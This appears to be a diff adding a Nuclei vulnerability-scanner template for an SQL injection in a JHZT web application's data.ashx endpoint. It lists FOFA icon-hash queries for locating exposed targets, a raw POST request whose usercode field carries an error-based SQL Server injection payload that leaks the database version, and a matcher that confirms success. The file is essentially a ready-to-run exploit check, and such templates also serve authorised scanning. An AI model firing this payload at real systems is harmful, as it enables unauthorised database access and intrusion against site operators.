@@ -1,0 +1,30 @@
+id: JHZT-data-ashx-SQL
+
+info:
+  name: JHZT-data-ashx-SQL
+  author: lengmo
+  severity: high
+  description: JHZT-data-ashx-SQL
+  tags: sqli
+  metadata:
+    fofa-qeury: icon_hash="-2049533275" || icon_hash="-737808640" || icon_hash="-1557056363"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Connection: close
+ 
+        usercode=1' and 1=(convert(int,@@version))--&&mobile=
+
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(header,'text/plain') && contains(body,'SQL Server')" 
